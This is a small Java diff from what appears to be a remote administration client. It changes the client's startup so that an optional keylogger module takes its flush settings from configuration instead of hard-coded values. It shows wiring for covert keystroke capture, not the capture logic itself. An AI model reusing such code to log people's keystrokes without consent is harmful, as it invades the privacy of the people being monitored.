@@ -24,7 +24,6 @@ import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
 import com.subterranean_security.crimson.client.modules.Keylogger;
-import com.subterranean_security.crimson.client.modules.Keylogger.RefreshMethod;
 import com.subterranean_security.crimson.core.Common;
 import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
 import com.subterranean_security.crimson.core.storage.ClientDB;
@@ -71,8 +70,7 @@ public class Client {
 		log.debug("CVID: {}", Common.cvid);
 
 		if (ic.getKeylogger() && !GraphicsEnvironment.isHeadless()) {
-			// TODO set parameters
-			Keylogger.start(RefreshMethod.TIME, 20000);
+			Keylogger.start(ic.getKeyloggerFlushMethod(), ic.getKeyloggerFlushValue());
 		}
 
 		ClientStore.Connections.setTargets(ic.getTargetList());
